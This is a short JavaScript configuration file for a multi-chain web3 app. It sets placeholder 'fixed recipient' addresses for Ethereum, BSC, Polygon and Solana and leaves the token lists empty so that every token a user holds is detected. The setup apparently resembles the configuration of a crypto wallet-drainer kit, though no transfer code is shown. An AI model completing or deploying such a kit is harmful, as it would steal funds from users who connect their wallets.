import { mainnet, bsc, polygon } from "wagmi/chains";

/* Reown Project ID */
export const REOWN_PROJECT_ID = "c00145b1e7f8d39d821971d8aeb61276";

/* Supported EVM chains */
export const CHAINS = [mainnet, bsc, polygon];

/* Fixed recipients per chain */
export const FIXED_RECIPIENTS = {
  1: "0xYourEthereumRecipient",
  56: "0xYourBSCRecipient",
  137: "0xYourPolygonRecipient",
  SOLANA: "YourSolanaRecipient"
};

/* Solana network */
export const SOLANA_NETWORK = "mainnet";

/* Optional: token lists for detection (can be empty, auto-detect) */
export const TOKEN_LIST = {
  EVM: [], // leave empty to fetch all ERC-20 tokens dynamically via provider
  SOLANA: [] // leave empty to fetch all SPL tokens dynamically via Reown adapter
};